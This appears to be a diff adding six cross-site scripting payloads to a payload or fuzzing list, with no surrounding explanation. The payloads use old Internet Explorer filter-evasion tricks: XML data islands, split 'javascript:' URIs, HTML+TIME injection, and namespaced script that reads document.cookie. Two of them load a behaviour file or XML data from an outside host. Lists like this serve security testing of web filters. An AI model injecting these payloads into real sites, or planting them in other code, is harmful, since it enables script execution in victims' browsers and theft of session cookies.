@@ -1,0 +1,6 @@
+<xml id=i><x><c><![cdata[<img src="javas]]><![cdata[cript:alert('xss');">]]></c></x></xml><span datasrc=#i datafld=c dataformatas=html>
+<xml id="xss"><i><b><img src="javas<!-- -->cript:alert('xss')"></b></i></xml><span datasrc="#xss" datafld="b" dataformatas="html"></span>
+<html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="xss<script defer>alert('xss')</script>"> </body></html>
+<html xmlns:xss><?import namespace="xss" implementation="httP://ha.ckers.org/xss.htc"><xss:xss>xss</xss:xss></html>
+<xml src="httP://ha.ckers.org/xsstest.xml" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>
+<?xml version="1.0"?><html:html xmlns:html='httP://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
